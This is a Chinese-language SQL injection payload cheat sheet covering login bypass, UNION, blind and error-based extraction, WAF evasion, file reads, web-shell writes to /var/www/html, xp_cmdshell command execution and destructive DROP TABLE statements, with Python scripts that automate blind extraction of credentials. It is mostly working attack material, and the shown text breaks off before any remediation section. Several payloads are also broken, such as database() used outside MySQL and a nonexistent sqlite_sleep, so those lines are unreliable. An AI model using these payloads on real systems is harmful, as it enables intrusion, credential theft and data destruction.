# SQL 注入 Payload 和绕过技术完整指南

## 目录

1. [SQL 注入基础](#一sql-注入基础)
2. [数据库类型识别](#二数据库类型识别)
3. [经典注入 Payload](#三经典注入-payload)
4. [盲注 Payload](#四盲注-payload)
5. [时间盲注 Payload](#五时间盲注-payload)
6. [联合查询注入](#六联合查询注入)
7. [错误注入](#七错误注入)
8. [堆叠查询注入](#八堆叠查询注入)
9. [二阶注入](#九二阶注入)
10. [编码绕过技术](#十编码绕过技术)
11. [过滤绕过技术](#十一过滤绕过技术)
12. [WAF 绕过技术](#十二waf-绕过技术)
13. [数据库特定 Payload](#十三数据库特定-payload)
14. [数据提取技术](#十四数据提取技术)
15. [文件操作](#十五文件操作)
16. [命令执行](#十六命令执行)
17. [绕过认证](#十七绕过认证)
18. [NoSQL 注入](#十八nosql-注入)
19. [实战案例](#十九实战案例)
20. [安全修复建议](#二十安全修复建议)

---

## 一、SQL 注入基础

### 1.1 什么是 SQL 注入

SQL 注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意 SQL 代码，从而操纵后端数据库。

### 1.2 SQL 注入的危害

- 数据泄露
- 数据篡改
- 认证绕过
- 权限提升
- 服务器控制

### 1.3 SQL 注入类型

- **In-band（经典注入）**
  - 联合查询注入
  - 错误注入

- **Inferential（盲注）**
  - 布尔盲注
  - 时间盲注

- **Out-of-band（二阶注入）**
  - 存储后触发
  - 延迟执行

---

## 二、数据库类型识别

### 2.1 MySQL 识别

```sql
' OR 1=1--
' OR 1=1#
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5(1))--
```

### 2.2 PostgreSQL 识别

```sql
' OR 1=1--
' AND 1=CAST((SELECT 1) AS INT)--
' AND 1=pg_sleep(5)--
```

### 2.3 SQL Server 识别

```sql
' OR 1=1--
' AND 1=CONVERT(INT,(SELECT 1))--
' AND 1=WAITFOR DELAY '0:0:5'--
```

### 2.4 Oracle 识别

```sql
' OR '1'='1'--
' AND 1=CAST((SELECT 1) AS NUMBER)--
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('X',5)--
```

### 2.5 SQLite 识别

```sql
' OR 1=1--
' AND 1=CAST((SELECT 1) AS INT)--
' AND 1=sqlite_sleep(5)--
```

### 2.6 通用识别 Payload

```sql
' OR 1=1--
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
' AND 1=CAST((SELECT 1) AS INT)--
```

---

## 三、经典注入 Payload

### 3.1 基础注入

```sql
-- MySQL
' OR 1=1--
' OR 1=1#

-- PostgreSQL
' OR 1=1--

-- SQL Server
' OR 1=1--

-- Oracle
' OR '1'='1'--

-- SQLite
' OR 1=1--
```

### 3.2 登录绕过

```sql
-- 用户名注入
admin' --

-- 用户名和密码注入
admin' OR '1'='1'--
admin' OR '1'='1'#
admin'--

-- 密码注入
' OR '1'='1'--
' OR 1=1--
```

### 3.3 联合查询注入

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--

-- 联合查询
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--

-- 提取数据库信息
' UNION SELECT database(),user(),version()--
' UNION SELECT @@version,user(),database()--
' UNION SELECT version(),user(),database()--
```

### 3.4 错误注入

```sql
-- MySQL 错误注入
' AND 1=CAST((SELECT database()) AS INT)--
' AND 1=CONVERT((SELECT database()),INT)--
' AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND 1=UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--

-- PostgreSQL 错误注入
' AND 1=CAST((SELECT database()) AS INT)--
' AND 1=CONVERT((SELECT database()),INT)--

-- SQL Server 错误注入
' AND 1=CONVERT(INT,(SELECT database()))--
' AND 1=CAST((SELECT database()) AS INT)--
```

---

## 四、盲注 Payload

### 4.1 布尔盲注

```sql
-- MySQL
' AND 1=1--
' AND 1=2--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))<128--

-- PostgreSQL
' AND 1=1--
' AND 1=2--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))<128--

-- SQL Server
' AND 1=1--
' AND 1=2--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))<128--

-- Oracle
' AND 1=1--
' AND 1=2--
' AND ASCII(SUBSTR((SELECT database()),1,1))>64--
' AND ASCII(SUBSTR((SELECT database()),1,1))<128--
```

### 4.2 布尔盲注 - 数据提取

```sql
-- MySQL - 提取数据库名
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--  -- 's'

-- MySQL - 提取表名
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>64--

-- MySQL - 提取列名
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--

-- MySQL - 提取数据
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>64--
```

### 4.3 布尔盲注 - 自动化脚本

```python
import requests

def blind_sqli(url, param, payload_template):
    result = ""
    for i in range(1, 100):
        for j in range(32, 127):
            payload = payload_template.format(i, j)
            params = {param: payload}
            response = requests.get(url, params=params)
            if "true" in response.text.lower():
                result += chr(j)
                print(f"Found character {i}: {chr(j)}")
                break
        if j == 126:
            break
    return result

# 使用示例
url = "http://example.com/search"
param = "id"
payload_template = "1' AND ASCII(SUBSTRING((SELECT database()),{},1))={}--"
result = blind_sqli(url, param, payload_template)
print(f"Database name: {result}")
```

---

## 五、时间盲注 Payload

### 5.1 基础时间盲注

```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5(1))--
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--

-- PostgreSQL
' AND pg_sleep(5)--
' AND 1=CAST((SELECT pg_sleep(5)) AS INT)--

-- SQL Server
' AND WAITFOR DELAY '0:0:5'--
' AND 1=CONVERT(INT,(SELECT WAITFOR DELAY '0:0:5'))--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('X',5)=1--
' AND DBMS_LOCK.SLEEP(5)=1--

-- SQLite
' AND sqlite_sleep(5)--
```

### 5.2 时间盲注 - 数据提取

```sql
-- MySQL - 提取数据库名
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115,SLEEP(5),0)--  -- 's'

-- MySQL - 提取表名
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>64,SLEEP(5),0)--

-- MySQL - 提取列名
' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64,SLEEP(5),0)--

-- MySQL - 提取数据
' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>64,SLEEP(5),0)--
```

### 5.3 时间盲注 - 自动化脚本

```python
import requests
import time

def time_blind_sqli(url, param, payload_template, delay=5):
    result = ""
    for i in range(1, 100):
        for j in range(32, 127):
            payload = payload_template.format(i, j, delay)
            params = {param: payload}
            start_time = time.time()
            response = requests.get(url, params=params)
            end_time = time.time()
            if end_time - start_time >= delay:
                result += chr(j)
                print(f"Found character {i}: {chr(j)}")
                break
        if j == 126:
            break
    return result

# 使用示例
url = "http://example.com/search"
param = "id"
payload_template = "1' AND IF(ASCII(SUBSTRING((SELECT database()),{},1))={},SLEEP({}),0)--"
result = time_blind_sqli(url, param, payload_template)
print(f"Database name: {result}")
```

---

## 六、联合查询注入

### 6.1 确定列数

```sql
-- ORDER BY 方法
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--

-- UNION SELECT 方法
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### 6.2 确定显示位置

```sql
-- MySQL
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--

-- PostgreSQL
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--

-- SQL Server
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```

### 6.3 提取数据库信息

```sql
-- MySQL
' UNION SELECT database(),user(),version()--
' UNION SELECT @@version,user(),database()--
' UNION SELECT version(),user(),database()--

-- PostgreSQL
' UNION SELECT current_database(),user,version()--
' UNION SELECT version(),user,current_database()--

-- SQL Server
' UNION SELECT DB_NAME(),SYSTEM_USER,@@version--
' UNION SELECT @@version,SYSTEM_USER,DB_NAME()--

-- Oracle
' UNION SELECT (SELECT SYS.DATABASE_NAME FROM DUAL),(SELECT USER FROM DUAL),(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)--
```

### 6.4 提取表名

```sql
-- MySQL
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='testdb'--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--

-- PostgreSQL
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='testdb'--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1--

-- SQL Server
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_catalog='testdb'--
' UNION SELECT TOP 1 table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT TOP 1 table_name,NULL,NULL FROM information_schema.tables WHERE table_name NOT IN ('users')--

-- Oracle
' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='TESTDB'--
' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='TESTDB' AND ROWNUM=1--
' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='TESTDB' AND ROWNUM<=2--
```

### 6.5 提取列名

```sql
-- MySQL
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1,1--

-- PostgreSQL
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1--

-- SQL Server
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT TOP 1 column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT TOP 1 column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ('id')--

-- Oracle
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1--
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM<=2--
```

### 6.6 提取数据

```sql
-- MySQL
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT username,password,NULL FROM users LIMIT 0,1--
' UNION SELECT username,password,NULL FROM users LIMIT 1,1--

-- PostgreSQL
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT username,password,NULL FROM users LIMIT 1 OFFSET 0--
' UNION SELECT username,password,NULL FROM users LIMIT 1 OFFSET 1--

-- SQL Server
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT TOP 1 username,password,NULL FROM users--
' UNION SELECT TOP 1 username,password,NULL FROM users WHERE username NOT IN ('admin')--

-- Oracle
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT username,password,NULL FROM users WHERE ROWNUM=1--
' UNION SELECT username,password,NULL FROM users WHERE ROWNUM<=2--
```

---

## 七、错误注入

### 7.1 MySQL 错误注入

```sql
-- CAST 错误注入
' AND 1=CAST((SELECT database()) AS INT)--
' AND 1=CONVERT((SELECT database()),INT)--

-- EXTRACTVALUE 错误注入
' AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--

-- UPDATEXML 错误注入
' AND 1=UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
' AND 1=UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--

-- FLOOR 错误注入
' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- GROUP BY 错误注入
' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 7.2 PostgreSQL 错误注入

```sql
-- CAST 错误注入
' AND 1=CAST((SELECT database()) AS INT)--
' AND 1=CONVERT((SELECT database()),INT)--

-- 类型转换错误
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT user) AS INT)--
```

### 7.3 SQL Server 错误注入

```sql
-- CONVERT 错误注入
' AND 1=CONVERT(INT,(SELECT database()))--
' AND 1=CAST((SELECT database()) AS INT)--

-- 类型转换错误
' AND 1=CONVERT(INT,(SELECT version()))--
' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))--

-- HAVING 错误注入
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' HAVING 1=1)--
```

### 7.4 Oracle 错误注入

```sql
-- CAST 错误注入
' AND 1=CAST((SELECT database()) AS NUMBER)--
' AND 1=TO_NUMBER((SELECT database()))--

-- 类型转换错误
' AND 1=TO_NUMBER((SELECT version()))--
' AND 1=TO_NUMBER((SELECT user FROM DUAL))--

-- UTL_INADDR 错误注入
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT database()))--
```

---

## 八、堆叠查询注入

### 8.1 MySQL 堆叠查询

```sql
-- 基础堆叠查询
'; DROP TABLE users--
'; INSERT INTO users (username,password) VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE test (id INT)--

-- 读取文件
'; SELECT LOAD_FILE('/etc/passwd')--

-- 写入文件
'; SELECT 'test' INTO OUTFILE '/tmp/test.txt'--
'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- 执行命令（需要特定权限）
'; SELECT sys_exec('whoami')--
'; SELECT sys_eval('whoami')--
```

### 8.2 PostgreSQL 堆叠查询

```sql
-- 基础堆叠查询
'; DROP TABLE users--
'; INSERT INTO users (username,password) VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE test (id INT)--

-- 执行命令（需要特定权限）
'; SELECT pg_exec('whoami')--
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT--
'; SELECT system('whoami')--
```

### 8.3 SQL Server 堆叠查询

```sql
-- 基础堆叠查询
'; DROP TABLE users--
'; INSERT INTO users (username,password) VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE test (id INT)--

-- 执行命令（需要特定权限）
'; EXEC xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'whoami'--

-- 启用 xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1--
'; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
```

### 8.4 Oracle 堆叠查询

```sql
-- 基础堆叠查询
'; DROP TABLE users--
'; INSERT INTO users (username,password) VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE test (id INT)--

-- 执行命令（需要特定权限）
'; BEGIN DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id'); END;--
'; EXEC DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id');--
```

---

## 九、二阶注入

### 9.1 二阶注入原理

二阶注入是指恶意代码首先被存储在数据库中，然后在后续的查询中被执行。

### 9.2 二阶注入示例

```sql
-- 第一步：存储恶意代码
-- 注册用户名为：admin'--
INSERT INTO users (username,password) VALUES ('admin'--','password')

-- 第二步：触发执行
-- 查询用户信息
SELECT * FROM users WHERE username='admin'--' AND password='password'

-- 实际执行的 SQL
SELECT * FROM users WHERE username='admin'--' AND password='password'
-- 等价于
SELECT * FROM users WHERE username='admin'
```

### 9.3 二阶注入实战案例

```sql
-- 案例 1：用户资料更新
-- 第一步：更新用户资料
UPDATE users SET bio='test',admin=1 WHERE username='admin'--' WHERE id=1

-- 第二步：查看用户资料
SELECT * FROM users WHERE id=1
-- 实际执行的 SQL
SELECT * FROM users WHERE id=1 AND bio='test',admin=1 WHERE username='admin'--'

-- 案例 2：订单查询
-- 第一步：创建订单
INSERT INTO orders (user_id,product_id) VALUES (1,'1' UNION SELECT username,password FROM users--')

-- 第二步：查询订单
SELECT * FROM orders WHERE user_id=1
-- 实际执行的 SQL
SELECT * FROM orders WHERE user_id=1 AND product_id='1' UNION SELECT username,password FROM users--'
```

---

## 十、编码绕过技术

### 10.1 URL 编码

```sql
-- 单次 URL 编码
%27%20OR%201%3D1--
%27%20OR%201%3D1%23

-- 双重 URL 编码
%2527%2520OR%25201%253D1--
%2527%2520OR%25201%253D1%2523
```

### 10.2 十六进制编码

```sql
-- 十六进制编码
' OR 1=1--
0x27204F5220313D31--

-- 十六进制编码字符串
SELECT * FROM users WHERE username=0x61646D696E--
-- 等价于
SELECT * FROM users WHERE username='admin'
```

### 10.3 Unicode 编码

```sql
-- Unicode 编码
' OR 1=1--
\u0027\u0020OR\u00201\u003D1--

-- Unicode 编码字符串
SELECT * FROM users WHERE username=\u0061\u0064\u006D\u0069\u006E--
-- 等价于
SELECT * FROM users WHERE username='admin'
```

### 10.4 Base64 编码

```sql
-- Base64 编码（需要在应用程序中解码）
JyBPUiAxPTEtLQ==  -- ' OR 1=1--

-- Base64 编码字符串
YWRtaW4=  -- admin
```

---

## 十一、过滤绕过技术

### 11.1 空格过滤绕过

```sql
-- 使用注释符替代空格
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/1,2,3--

-- 使用换行符替代空格
'%0AOR%0A1=1--
'%0AUNION%0ASELECT%0A1,2,3--

-- 使用制表符替代空格
'%09OR%091=1--
'%09UNION%09SELECT%091,2,3--

-- 使用括号替代空格
' OR(1=1)--
' UNION(SELECT(1),2,3)--
```

### 11.2 注释符过滤绕过

```sql
-- 使用其他注释符
' OR 1=1#
' OR 1=1-- -
' OR 1=1;%00

-- 使用内联注释
' /*!OR*/ 1=1--
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- 使用分号
' OR 1=1;
' UNION SELECT 1,2,3;
```

### 11.3 关键字过滤绕过

```sql
-- 大小写绕过
' oR 1=1--
' uNiOn sElEcT 1,2,3--

-- 双写绕过
' OORR 1=1--
' UNUNIONION SESELECTLECT 1,2,3--

-- 使用等价函数
-- SELECT -> SEL%ECT, SELE%CT, SELEC%T
-- UNION -> UNIO%N, UNI%ON, UN%ION
-- WHERE -> WHE%RE, WH%ERE, W%HERE

-- 使用特殊字符
' OR/**/1=1--
' OR+1=1--
' OR%201=1--
```

### 11.4 特殊字符过滤绕过

```sql
-- 单引号过滤绕过
-- 使用十六进制编码
SELECT * FROM users WHERE username=0x61646D696E--

-- 使用双引号（如果支持）
SELECT * FROM users WHERE username="admin"--

-- 使用反引号（MySQL）
SELECT * FROM users WHERE username=`admin`--

-- 使用 CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--

-- 等号过滤绕过
-- 使用 LIKE
' OR 1 LIKE 1--

-- 使用 REGEXP
' OR 1 REGEXP 1--

-- 使用 BETWEEN
' OR 1 BETWEEN 1 AND 1--

-- 使用 IN
' OR 1 IN (1)--

-- 使用 <>
' OR 1<>0--
```

### 11.5 AND/OR 过滤绕过

```sql
-- 使用 &&
' && 1=1--

-- 使用 ||
' || 1=1--

-- 使用 XOR
' XOR 1=1--

-- 使用 NOT
' NOT 1=2--
```

---

## 十二、WAF 绕过技术

### 12.1 HTTP 参数污染

```sql
-- 使用多个相同参数
?id=1&id=2&id=3

-- 使用数组参数
?id[]=1&id[]=2&id[]=3
```

### 12.2 分块编码

```http
POST /login HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

4
user
5
=admin
0
```

### 12.3 大小写混淆

```sql
' oR 1=1--
' uNiOn sElEcT 1,2,3--
' AnD 1=1--
```

### 12.4 编码混淆

```sql
-- 混合编码
' OR 1=1--
%27%20%4F%52%20%31%3D%31--

-- 双重编码
%2527%2520%254F%2552%2520%2531%253D%2531--

-- Unicode 编码
\u0027\u0020OR\u00201\u003D1--
```

### 12.5 注释混淆

```sql
-- 内联注释
' /*!OR*/ 1=1--
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- 版本注释
' /*!00000OR*/ 1=1--
' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--

-- 多行注释
'
OR
1=1
--
```

### 12.6 空格混淆

```sql
-- 使用注释符
'/**/OR/**/1=1--

-- 使用换行符
'%0AOR%0A1=1--

-- 使用制表符
'%09OR%091=1--

-- 使用括号
' OR(1=1)--
```

---

## 十三、数据库特定 Payload

### 13.1 MySQL 特定 Payload

```sql
-- 版本信息
SELECT @@version
SELECT version()

-- 当前用户
SELECT user()
SELECT current_user()
SELECT system_user()

-- 当前数据库
SELECT database()

-- 数据库列表
SELECT schema_name FROM information_schema.schemata

-- 表列表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 列列表
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 读取文件
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')

-- 写入文件
SELECT 'test' INTO OUTFILE '/tmp/test.txt'
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- 执行命令（需要特定权限）
SELECT sys_exec('whoami')
SELECT sys_eval('whoami')
```

### 13.2 PostgreSQL 特定 Payload

```sql
-- 版本信息
SELECT version()

-- 当前用户
SELECT user
SELECT current_user

-- 当前数据库
SELECT current_database()

-- 数据库列表
SELECT datname FROM pg_database

-- 表列表
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- 列列表
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 执行命令（需要特定权限）
SELECT pg_exec('whoami')
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
SELECT system('whoami')
```

### 13.3 SQL Server 特定 Payload

```sql
-- 版本信息
SELECT @@version

-- 当前用户
SELECT SYSTEM_USER
SELECT USER_NAME()

-- 当前数据库
SELECT DB_NAME()

-- 数据库列表
SELECT name FROM master..sysdatabases

-- 表列表
SELECT name FROM sysobjects WHERE xtype='U'

-- 列列表
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- 执行命令（需要特定权限）
EXEC xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'whoami'

-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'
```

### 13.4 Oracle 特定 Payload

```sql
-- 版本信息
SELECT * FROM v$version

-- 当前用户
SELECT user FROM dual

-- 当前数据库
SELECT SYS.DATABASE_NAME FROM dual

-- 数据库列表
SELECT owner FROM all_tables

-- 表列表
SELECT table_name FROM all_tables WHERE owner='TESTDB'

-- 列列表
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- 执行命令（需要特定权限）
BEGIN DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id'); END;
EXEC DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id');
```

### 13.5 SQLite 特定 Payload

```sql
-- 版本信息
SELECT sqlite_version()

-- 当前数据库
SELECT database()

-- 表列表
SELECT name FROM sqlite_master WHERE type='table'

-- 列列表
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'
```

---

## 十四、数据提取技术

### 14.1 逐字符提取

```sql
-- MySQL
SELECT SUBSTRING((SELECT database()),1,1)
SELECT SUBSTRING((SELECT database()),2,1)
SELECT ASCII(SUBSTRING((SELECT database()),1,1))

-- PostgreSQL
SELECT SUBSTRING((SELECT database()),1,1)
SELECT SUBSTRING((SELECT database()),2,1)
SELECT ASCII(SUBSTRING((SELECT database()),1,1))

-- SQL Server
SELECT SUBSTRING((SELECT database()),1,1)
SELECT SUBSTRING((SELECT database()),2,1)
SELECT ASCII(SUBSTRING((SELECT database()),1,1))

-- Oracle
SELECT SUBSTR((SELECT database()),1,1)
SELECT SUBSTR((SELECT database()),2,1)
SELECT ASCII(SUBSTR((SELECT database()),1,1))
```

### 14.2 批量提取

```sql
-- MySQL
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'

-- PostgreSQL
SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public'
SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='users'

-- SQL Server
SELECT STUFF((SELECT ',' + table_name FROM information_schema.tables FOR XML PATH('')),1,1,'')
SELECT STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name='users' FOR XML PATH('')),1,1,'')

-- Oracle
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='TESTDB'
SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='USERS'
```

### 14.3 条件提取

```sql
-- MySQL
SELECT CASE WHEN (SELECT database())='testdb' THEN 'true' ELSE 'false' END
SELECT IF((SELECT database())='testdb','true','false')

-- PostgreSQL
SELECT CASE WHEN (SELECT database())='testdb' THEN 'true' ELSE 'false' END

-- SQL Server
SELECT CASE WHEN (SELECT DB_NAME())='testdb' THEN 'true' ELSE 'false' END

-- Oracle
SELECT CASE WHEN (SELECT SYS.DATABASE_NAME FROM dual)='TESTDB' THEN 'true' ELSE 'false' END FROM dual
```

---

## 十五、文件操作

### 15.1 MySQL 文件操作

```sql
-- 读取文件
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')

-- 写入文件
SELECT 'test' INTO OUTFILE '/tmp/test.txt'
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- 写入二进制文件
SELECT 0x3c3f7068702073797374656d28245f4745545b636d645d293b203f3e INTO OUTFILE '/var/www/html/shell.php'
```

### 15.2 PostgreSQL 文件操作

```sql
-- 读取文件（需要特定权限）
SELECT pg_read_file('/etc/passwd', 0, 100)

-- 写入文件（需要特定权限）
COPY (SELECT 'test') TO '/tmp/test.txt'
```

### 15.3 SQL Server 文件操作

```sql
-- 读取文件（需要特定权限）
EXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts'

-- 写入文件（需要特定权限）
EXEC xp_cmdshell 'echo test > C:\\test.txt'
```

### 15.4 Oracle 文件操作

```sql
-- 读取文件（需要特定权限）
SELECT UTL_FILE.FOPEN('/tmp','test.txt','R') FROM dual
```

---

## 十六、命令执行

### 16.1 MySQL 命令执行

```sql
-- 使用 UDF（需要特定权限）
SELECT sys_exec('whoami')
SELECT sys_eval('whoami')

-- 使用存储过程（需要特定权限）
CREATE FUNCTION shell RETURNS STRING SONAME 'lib_mysqludf_sys.so'
SELECT shell('whoami')
```

### 16.2 PostgreSQL 命令执行

```sql
-- 使用 pg_exec（需要特定权限）
SELECT pg_exec('whoami')

-- 使用自定义函数（需要特定权限）
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
SELECT system('whoami')
```

### 16.3 SQL Server 命令执行

```sql
-- 使用 xp_cmdshell（需要特定权限）
EXEC xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'whoami'

-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1
